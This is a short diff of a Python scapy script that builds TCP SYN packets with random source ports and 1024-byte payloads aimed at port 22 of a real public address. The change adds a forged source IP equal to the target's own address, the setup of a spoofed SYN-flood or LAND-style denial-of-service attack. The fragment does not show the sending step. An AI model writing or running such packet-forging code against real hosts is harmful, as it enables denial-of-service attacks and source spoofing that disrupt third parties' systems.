@@ -11,9 +11,10 @@ from scapy.layers.inet import IP, TCP
 # have a chance to do anything with scapy.
 
 target_ip = '8.8.8.8'
+source_ip = '8.8.8.8'
 target_port = 22
 
-ip = IP(dst=target_ip)
+ip = IP(dst=target_ip, src=source_ip)
 tcp = TCP(sport=RandShort(), dport=target_port, flags="S")
 raw = Raw(b"X"*1024)
 packet = ip/tcp/raw
